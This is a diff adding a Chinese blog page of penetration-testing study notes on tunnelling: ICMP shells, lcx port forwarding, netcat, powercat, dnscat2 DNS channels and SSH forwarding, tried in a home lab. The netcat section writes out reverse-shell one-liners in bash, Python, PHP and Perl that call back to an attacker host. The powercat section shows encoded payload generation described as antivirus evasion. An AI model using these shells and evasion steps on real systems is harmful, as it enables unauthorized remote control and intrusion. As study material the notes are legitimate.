@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8"/>
+    <meta name="viewport" content="initial-scale=1.0, width=device-width"/>
+    <title>
+      
+        隧道 | Blanks'Blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/apple-touch-icon.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/favicon-32x32.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/favicon-16x16.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/logo.svg"
+            color=""/>
+    
+    
+    
+      
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/regular.ttf);
+        font-weight: regular;
+    }
+  </style>
+
+  <style>
+    @font-face {
+        font-family:sourceHanSerif;
+        src: url(/font/bold.ttf);
+        font-weight: bold;
+    }
+  </style>
+
+
+    
+    <link rel="stylesheet"
+          type="text/css"
+          href='/css/layout.css'/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css" />
+  
+
+  <meta name="generator" content="Hexo 6.3.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href='/' class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/logo.svg"/>
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AD%A6%E4%B9%A0">Notes</a>
+            
+          
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner--toc">
+      <div class="post-content__head">
+        <div class="post-title">隧道</div>
+        <div class="post-info">
+          
+  <a href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" class="post-tag">#内网穿透</a><a href="/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/" class="post-tag">#端口转发</a><a href="/tags/%E5%BA%94%E7%94%A8%E5%B1%82-%E7%BD%91%E7%BB%9C%E5%B1%82-%E4%BC%A0%E8%BE%93%E5%B1%82/" class="post-tag">#应用层,网络层,传输层</a>
+
+
+          <span class="post-date">2023-04-25</span>
+        </div>
+      </div>
+      
+        <aside class="toc-outer">
+          <div class="toc-title">目录</div>
+          <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">网络层隧道</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">icmpsh</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">传输层隧道</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">Icx端口转发</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">netcat</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">端口扫描</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">正向连接</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">反向shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">文件传输</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">nc作为代理</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">powercat</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">powercat 正向连接</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">powercat 反向连接</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">win7反向连接win2008 并返回Powershell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Powercat 文件传输</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Powercat 生成 payload（躲避杀软）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">Powercat  - DNS协议（DNSCAT）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">powercat 转发</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">应用层隧道</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">SSH隧道</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">SSH 配置文件</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">本地转发和远程转发</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link"><span class="post-toc-text">本地端口转发</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">HTTP协议 —reGeorg隧道</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link"><span class="post-toc-text">DNS 隧道工具</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link"><span class="post-toc-text">隧道技术的优势和劣势</span></a></li></ol>
+          <a href="#" class="toc-top">回到顶部</a>
+        </aside>
+      
+      <div class="post-content__body">
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <meta name="referrer" content="no-referrer">
+
+
+
+
+
+<p><a name="LgyOp"></a></p>
+<h1><span id="网络层隧道">网络层隧道</span></h1><p>1.IPv6隧道<br>2.ICMP隧道<br>ICMP隧道工具有  PingTunnel，icmptunnel，lcmpsh,powershell icmp等<br>A.icmpsh<br>B.pingtunnel</p>
+<p><a name="i3B5m"></a></p>
+<h2><span id="icmpsh">icmpsh</span></h2><p><a target="_blank" rel="noopener" href="https://github.com/bdamele/icmpsh">https://github.com/bdamele/icmpsh</a><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682309892676-3e3831d6-a290-4271-be60-37646cca3e81.png#averageHue=%231c1c1b&clientId=u73113eb3-0d69-4&from=paste&height=330&id=u7bd3a086&name=image.png&originHeight=659&originWidth=1554&originalType=binary&ratio=2&rotation=0&showTitle=false&size=61066&status=done&style=none&taskId=u9080387c-63ea-4c95-b405-aa990fc7152&title=&width=777" alt="image.png"></p>
+<p>:::info<br>sysctl -w net.ipv4.icmp_echo_ignore_all&#x3D;1<br>.&#x2F;icmpsh   m.py IP(公网) IP(内网)<br>icmpsh.exe -t 公网IP  -d 500 -b 30 -s 128<br>:::<br>使用本地模拟 ICMP<br>:::info<br>kali  192.168.145.130<br>win10  192.168.145.129<br>:::<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682319182436-bb763b6a-8d71-4bbb-a7b7-87a482dcd1c8.png#averageHue=%23252935&clientId=u73113eb3-0d69-4&from=paste&height=61&id=u7987e8d5&name=image.png&originHeight=122&originWidth=671&originalType=binary&ratio=2&rotation=0&showTitle=false&size=31172&status=done&style=none&taskId=ued9924b8-e4d1-4716-a584-c670c806313&title=&width=335.5" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682319194022-fe6e9d6c-e452-4979-befa-4de0d8053884.png#averageHue=%230f0f0f&clientId=u73113eb3-0d69-4&from=paste&height=203&id=u2afbc966&name=image.png&originHeight=405&originWidth=898&originalType=binary&ratio=2&rotation=0&showTitle=false&size=10440&status=done&style=none&taskId=u1990af63-e15d-48fd-9971-e288974903c&title=&width=449" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682319217470-1cddbe34-5797-4f06-b6b8-66d469a1900c.png#averageHue=%23758170&clientId=u73113eb3-0d69-4&from=paste&height=388&id=u106cb55b&name=image.png&originHeight=776&originWidth=1289&originalType=binary&ratio=2&rotation=0&showTitle=false&size=105354&status=done&style=none&taskId=ucc847d2d-df48-49db-a428-7091c7e18b7&title=&width=644.5" alt="image.png"><br>全都是ICMP包的数据  ，证明是使用ICMP传输的</p>
+<p><a name="AIiIM"></a></p>
+<h1><span id="传输层隧道">传输层隧道</span></h1><p><a name="TRw5i"></a></p>
+<h2><span id="icx端口转发">Icx端口转发</span></h2><p>:::info<br>1.Icx端口转发<br>A.内网端口转发<br>目标机器:<br>Icx.exe -slave 公网主机ip 4444 127.0.0.1 3389<br>VPS: <br>Icx.exe -listen 4444 5555</p>
+<p>B.本地端口映射<br>lcx -tran 53目标主机ip 3389</p>
+<p>没有找到exe 的 找一个 使用go开发的<br><a target="_blank" rel="noopener" href="https://github.com/cw1997/NATBypass">https://github.com/cw1997/NATBypass</a><br>:::</p>
+<p><a name="Xfnx4"></a></p>
+<h2><span id="netcat">netcat</span></h2><p><a name="pi0zO"></a></p>
+<h3><span id="端口扫描">端口扫描</span></h3><p><code>nc -v -z 192.168.145.129 1-3389</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682320362836-cf06a8e5-e3f4-4d2e-8995-69481a61fd1e.png#averageHue=%23232323&clientId=u73113eb3-0d69-4&from=paste&height=384&id=u459a6a3a&name=image.png&originHeight=767&originWidth=1711&originalType=binary&ratio=2&rotation=0&showTitle=false&size=146667&status=done&style=none&taskId=ub4d97d52-bdfa-4dbf-9b1f-5c293c4c98e&title=&width=855.5" alt="image.png"><br>这些是不存在的端口<br>这是存在的端口 <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682320394603-156dfcf2-1a9f-43c0-b6d1-fdf6835cb42a.png#averageHue=%23252525&clientId=u73113eb3-0d69-4&from=paste&height=53&id=ufd5e2d82&name=image.png&originHeight=106&originWidth=1469&originalType=binary&ratio=2&rotation=0&showTitle=false&size=18904&status=done&style=none&taskId=u6da498bb-f542-48ff-b045-907aa8af6a5&title=&width=734.5" alt="image.png"><br>也可以使用 <br><code>nc -nv 192.168.145.129 1-80</code><br>扫描到还会返回网页数据<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682320538237-d7f99da0-ad9c-49dd-bf1e-a9ab8a3d454b.png#averageHue=%23161616&clientId=u73113eb3-0d69-4&from=paste&height=477&id=udc8d983a&name=image.png&originHeight=953&originWidth=1930&originalType=binary&ratio=2&rotation=0&showTitle=false&size=112162&status=done&style=none&taskId=u8c84d8ec-8ae3-44a0-a0eb-e5d2bf37271&title=&width=965" alt="image.png"><br><a name="KuWLe"></a></p>
+<h3><span id="正向连接">正向连接</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">正向连接<br><br>服务器执行：<br>nc -l -p <span class="hljs-number">8888</span> -e cmd.exe  //windows<br>nc -lvp <span class="hljs-number">8888</span> -e /<span class="hljs-built_in">bin</span>/sh  //linux<br><br>本地主机执行：nc -vv 服务器ip <span class="hljs-number">8888</span><br></code></pre></td></tr></table></figure>
+<p><a name="SOkR0"></a></p>
+<h3><span id="反向shell">反向shell</span></h3><p>存在NC ，而且存在-e 参数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">vps攻击机：nc -lvp <span class="hljs-number">9999</span>      // 监听<span class="hljs-number">9999</span>端口<br>靶机：<br>nc <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">9999</span> -e /<span class="hljs-built_in">bin</span>/bash  // Linux正向连接公网vps1<span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>的<span class="hljs-number">9999</span>端口<br>nc <span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">9999</span> -e cmd.exe  // Windows<br></code></pre></td></tr></table></figure>
+<p>不存在NC</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">vps攻击机：<br>nc -lvp <span class="hljs-number">6666</span><br>靶机：<br>bash -I &gt;&amp; /dev/tcp/<span class="hljs-number">1.1</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span>/<span class="hljs-number">6666</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span>   //而且是linux<br></code></pre></td></tr></table></figure>
+<p>存在python 环境 </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">vps攻击机：nc -lvp <span class="hljs-number">6666</span><br>靶机：python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.32.1&quot;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>存在PHP环境</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">vps攻击机：nc -lvp <span class="hljs-number">6666</span><br>靶机：php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;192.168.145.129&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>存在Perl环境</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">Vps攻击机：nc -lvp <span class="hljs-number">6666</span><br>靶机：perl -e <span class="hljs-string">&#x27;use Socket; $i=&quot;192.168.32.1&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span>=<br></code></pre></td></tr></table></figure>
+<p><a name="n4LZT"></a></p>
+<h3><span id="文件传输">文件传输</span></h3><p>发送端</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">nc -v 接收端的ip 端口号&lt;被传输文件名<br>nc -v <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>  <span class="hljs-number">9999</span> &lt; test.jar<br></code></pre></td></tr></table></figure>
+<p>接收端</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">nc -l -v 端口号&gt;要写入的文件名（跟被传输文件名可以不一样）<br>nc -l -v <span class="hljs-number">9999</span> &gt; test1.jar<br></code></pre></td></tr></table></figure>
+<p>但是貌似不行，没-e参数 <br>传过来了是这么个数据<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682322605339-d785292c-a3d2-4421-bc7f-b9882b3ccd20.png#averageHue=%23111111&clientId=u73113eb3-0d69-4&from=paste&height=336&id=u145ee4e1&name=image.png&originHeight=671&originWidth=2309&originalType=binary&ratio=2&rotation=0&showTitle=false&size=53919&status=done&style=none&taskId=u76cb8c9f-0e39-4f57-9bda-1fd7357aa9e&title=&width=1154.5" alt="image.png"></p>
+<p><a name="DurD4"></a></p>
+<h3><span id="nc作为代理">nc作为代理</span></h3><p>使用nc作为一个简单的端口转发</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">ncat -l <span class="hljs-number">8080</span> | ncat <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
+<p>命令实现单向的转发，将链接到本机8080的连接转发到192.168.1.1:80<br>实现双向管道</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">mkfifo 2way<br>ncat -l <span class="hljs-number">8080</span> <span class="hljs-number">0</span>&lt;2way | ncat <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-number">1</span>&gt;2way<br></code></pre></td></tr></table></figure>
+
+
+<p><a name="b2ylo"></a></p>
+<h2><span id="powercat">powercat</span></h2><p>:::info<br>下载 powercat<br><a target="_blank" rel="noopener" href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a><br>导入 powercat<br>先设置权限<br>Set-ExecutionPolicy Unrestricted<br>再导入<br>Import-Module .\powercat.psl<br>查看帮助  -h <br>powercat -h<br>:::</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">PowerCat常用命令：<br>-l 监听模式<br>-c连接到侦听器 <br>-p要连接或监听的端口 <br>-e执行 <br>-ep执行Powershell <br>-r中继。格式<span class="hljs-string">&quot;-r tcp: 10.1.1.1:443&quot;</span><br>-u通过UDP传输数据<br>-dns通过dns传输数据 -dnsftNDS故障阀值 <br>-t超时选项。默认：<span class="hljs-number">60</span> -I输入：文件路径，字节数组或字符串 <br>-o控制台输出类型：<span class="hljs-string">&#x27;&#x27;</span>主机<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>字节<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>字符串<span class="hljs-string">&#x27;&#x27;</span> <br>-of输出文件路径 <br>-d连接后断开连接 <br>-rep中继器。断开连接后重启<br>-g生成有效载荷 <br>-ge生成编码有效载荷 <br>-h打印帮助信息<br></code></pre></td></tr></table></figure>
+<p><a name="W5HTe"></a></p>
+<h3><span id="powercat-正向连接">powercat 正向连接</span></h3><blockquote>
+<p> powercat -l  -p 4444 -e cmd -v      </p>
+</blockquote>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682324625135-aa4dd430-1098-4c80-9dbc-60569c796490.png#averageHue=%2312273a&clientId=u73113eb3-0d69-4&from=paste&height=89&id=u844e426c&name=image.png&originHeight=177&originWidth=698&originalType=binary&ratio=2&rotation=0&showTitle=false&size=17617&status=done&style=none&taskId=ue55abfea-5f5b-46cf-b274-27b265b3dd8&title=&width=349" alt="image.png"><br>nc  连接 <br><code> nc 192.168.145.129 4444</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682324655972-f66fe5c4-fb78-4f99-994d-c44e380a7ed6.png#averageHue=%23161616&clientId=u73113eb3-0d69-4&from=paste&height=185&id=u2ae6f251&name=image.png&originHeight=369&originWidth=1295&originalType=binary&ratio=2&rotation=0&showTitle=false&size=36167&status=done&style=none&taskId=u62dda4ef-edbe-439d-9970-2798b0c86fa&title=&width=647.5" alt="image.png"></p>
+<p><a name="Y7mxf"></a></p>
+<h3><span id="powercat-反向连接">powercat 反向连接</span></h3><p><code>nc  -l -p 8080 -vv</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682325005088-9424d400-9a20-4b78-9b86-b963503e3b75.png#averageHue=%23171717&clientId=u73113eb3-0d69-4&from=paste&height=268&id=u0de476cf&name=image.png&originHeight=536&originWidth=1167&originalType=binary&ratio=2&rotation=0&showTitle=false&size=48415&status=done&style=none&taskId=uc8b2f48a-e93a-47dc-ac77-3a8329e7377&title=&width=583.5" alt="image.png"><br>Windows 端 <br><code>powercat -c 172.23.85.7  -p 8080 -v -e cmd.exe   </code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682325039017-5a6b4219-282e-4e5a-a007-5b5cc76c1492.png#averageHue=%23ffff00&clientId=u73113eb3-0d69-4&from=paste&height=102&id=uc0dc28ce&name=image.png&originHeight=203&originWidth=917&originalType=binary&ratio=2&rotation=0&showTitle=false&size=9173&status=done&style=none&taskId=u4e4459a0-7563-42a8-bf70-a8770b138d9&title=&width=458.5" alt="image.png"></p>
+<p><a name="g45iZ"></a></p>
+<h3><span id="win7反向连接win2008-并返回powershell">win7反向连接win2008 并返回Powershell</span></h3><p>win7 执行<br><code>powercat  -l -p 8080 -v</code><br>win 2008 执行<br><code>powercat -c 192.168.145.10  -p 8080 -v -ep</code></p>
+<p><a name="ZyaFD"></a></p>
+<h3><span id="powercat-文件传输">Powercat 文件传输</span></h3><p>win7 执行 <br><code>powercat -l -p 8080 -of 路径 -v</code><br>win2008 <br><code>powercat -c 192.168.145.10 -p 8080 -i 路径 -v</code></p>
+<p><a name="rIv6g"></a></p>
+<h3><span id="powercat-生成-payload躲避杀软">Powercat 生成 payload（躲避杀软）</span></h3><p>win7<br><code>powercat -l -p 8080 -e cmd -v -g &gt;&gt;shell.ps1</code><br>或者<br><code>powercat  -l -p 8080 -e cmd  -v -ge </code><br>这样会生成编码 <br>可以在 08 执行 <br>powercat -E  生成后的编码 <br>win2008 <br><code>./shell.ps1</code></p>
+<p><a name="IfBxk"></a></p>
+<h3><span id="powercat-dns协议dnscat">Powercat  - DNS协议（DNSCAT）</span></h3><p>下载dnscat </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">git clone https://github.com/iagox86/dnscat2.git<br>cd dnscat2/client/<br>make<br><br>再进入 server<br><br>cd dnscat2/server/<br>gem install bundler<br>bundle install<br></code></pre></td></tr></table></figure>
+<p>linux 端 <br><code>ruby  dnscat2.rb  test.test  -e open --no-cache</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682326826302-748edfcd-541a-4b4e-bc8e-3ef7a75b907c.png#averageHue=%23161616&clientId=ufe587201-db87-4&from=paste&height=503&id=u83e8146e&name=image.png&originHeight=1006&originWidth=1720&originalType=binary&ratio=2&rotation=0&showTitle=false&size=101930&status=done&style=none&taskId=u0ed2327d-b47c-4315-95ab-a228a3bb9e0&title=&width=860" alt="image.png"></p>
+<p>windows端<br><code>powercat -c  172.23.85.7  -p 53  -dns test.test -e cmd</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682326847600-1836d779-330e-499f-8e6c-52cf140a0c78.png#averageHue=%23022454&clientId=ufe587201-db87-4&from=paste&height=114&id=u61b4f2a1&name=image.png&originHeight=227&originWidth=917&originalType=binary&ratio=2&rotation=0&showTitle=false&size=12890&status=done&style=none&taskId=u2caadc01-cdff-41af-8b2b-9a656a831a7&title=&width=458.5" alt="image.png"><br>就会返回linux 端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682326969078-fe2e9f48-0632-4fa7-af91-6fe85082985d.png#averageHue=%231b1b1b&clientId=ufe587201-db87-4&from=paste&height=57&id=ud47fde2e&name=image.png&originHeight=114&originWidth=964&originalType=binary&ratio=2&rotation=0&showTitle=false&size=11206&status=done&style=none&taskId=u05d80d22-657e-4317-8ae6-270725532e4&title=&width=482" alt="image.png"><br>输入 <br>session -i 1 <br>进行连接<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682327022124-42ff60fb-38eb-417c-9684-441a0551f8ac.png#averageHue=%23171717&clientId=ufe587201-db87-4&from=paste&height=444&id=u465d882c&name=image.png&originHeight=887&originWidth=1264&originalType=binary&ratio=2&rotation=0&showTitle=false&size=74313&status=done&style=none&taskId=uec0d9c10-a0a0-4917-b424-8d6294b4727&title=&width=632" alt="image.png"><br>因为是dns 所以反应比较慢<br><a name="cpJos"></a></p>
+<h3><span id="powercat-转发">powercat 转发</span></h3><p>win08 <br><code>powercat  -l -v -p 9999 -e cmd</code><br>win7 <br><code>powercat -l -v -p 8000 -r tcp:192.168.145.129:9999</code><br>linux <br><code>nc 172.23.85.7 8000 -vv</code></p>
+<p><a name="iANYU"></a></p>
+<h1><span id="应用层隧道">应用层隧道</span></h1><p><a name="DcBJL"></a></p>
+<h2><span id="ssh隧道">SSH隧道</span></h2><p>:::info<br>SSH协议原理<br>SSH中间人攻击原理<br>SSH隧道技术3种转发原理<br>三种转发技术的应用场景分析<br>动态转发的衍生利用技术<br>·本地端口转发+远程端口转发的应用场景<br>:::<br>在应用层的隧道通信技术是利用应用软件提供的端口发送数据，常用的隧道协议是SSH、 HTTP、 HTTPS和DNS。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682337380185-992a1857-f9ea-4229-a422-6c0573e67855.png#averageHue=%23c1c2ba&clientId=ua9469c0c-7088-4&from=paste&height=517&id=u1b78a704&name=image.png&originHeight=517&originWidth=1147&originalType=binary&ratio=1&rotation=0&showTitle=false&size=299742&status=done&style=none&taskId=uad7a8258-2dfb-4343-b887-ff9f28ef97d&title=&width=1147" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682338838736-a72a78a3-e5c6-4910-b0cd-4cff535b7858.png#averageHue=%23a4a4a8&clientId=ua9469c0c-7088-4&from=paste&height=489&id=u994d7adc&name=image.png&originHeight=489&originWidth=1128&originalType=binary&ratio=1&rotation=0&showTitle=false&size=114097&status=done&style=none&taskId=u236502cc-10ad-4d46-8f3d-56fcac94225&title=&width=1128" alt="image.png"><br>大概理解为：<br>本质上就是端口转发。它能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。 SSH 端口转发能够提供两大功能： 1.加密 SSH Client 端至 SSH Server 端之间的通讯数据。 2.突破防火墙的限制完成一些之前无法建立的 TCP 连接。</p>
+<p><a name="Tinzl"></a></p>
+<h3><span id="ssh-配置文件">SSH 配置文件</span></h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1682340646691-eafaa304-d877-416c-83b6-3d73e817960d.png#averageHue=%23dcdeda&clientId=ua9469c0c-7088-4&from=paste&height=212&id=uaddb9c4a&name=image.png&originHeight=212&originWidth=541&originalType=binary&ratio=1&rotation=0&showTitle=false&size=129766&status=done&style=none&taskId=u02888bd8-8242-403a-84f0-056f7c4168b&title=&width=541" alt="image.png"><br><strong>ssh 常用命令参数</strong><br>:::info<br>创建隧道常用的参数说明： <br>-C：压缩传输，提高传输速度 <br>-f：将ssh转入后台执行，不占用当前的shell <br>-N：建立静默连接（不回显ssh页面） <br>-g：允许远程主机连接本地用于端口转发的端口<br>-L：本地端口转发<br>-R：远程端口转发 <br>-D：动态端口转发（socket代理） <br>-p：指定ssh端<br>:::</p>
+<p><a name="x3GAW"></a></p>
+<h3><span id="本地转发和远程转发">本地转发和远程转发</span></h3><p>SSH 端口转发自然需要 SSH 连接，而 SSH 连接是有方向的，从 SSH Client 到 SSH Server 。而我们的应用也是有方向的，比如需要连接 LDAP Server 时，LDAP Server 自然就是 Server 端，我们应用连接的方向也是从应用的 Client 端连接到应用的 Server 端。如果这两个连接的方向一致，那我们就说它是本地转发。而如果两个方向不一致，我们就说它是远程转发。 另一个方便记忆的方法是，Server 端的端口都是预定义的固定端口（SSH Server 的端口 22，LDAP 的端口 389），而 Client 端的端口都是动态可供我们选择的端口（如上述例子中选用的 7001 端口）。如果 Server 端的两个端口都在同一台机器，Client 端的两个端口都在另一台机器上，那么这就是本地连接；如果这四个端口交叉分布在两个机器上，每台机器各有一个 Server 端端口，一个 Client 端端口，那就是远程连接</p>
+<p><a name="iYtFP"></a></p>
+<h3><span id="本地端口转发">本地端口转发</span></h3><p>:::info<br>ssh -L 本地端口:目标主机:目标端口   jump<br>ssh -L 2121:1.1.10:21 <a href="mailto:&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#46;&#49;&#49;">&#x72;&#x6f;&#111;&#116;&#64;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#49;&#46;&#49;&#49;</a><br>:::</p>
+<p>都挺简单，由于 命令就几条，但是要配置环境就没去配置了 <br>参考 ：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_42742658/article/details/122735119">https://blog.csdn.net/weixin_42742658&#x2F;article&#x2F;details&#x2F;122735119</a><br><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/513691592">https://zhuanlan.zhihu.com/p/513691592</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38844490/article/details/126776873">https://blog.csdn.net/qq_38844490&#x2F;article&#x2F;details&#x2F;126776873</a></p>
+<p><a name="e7Yqy"></a></p>
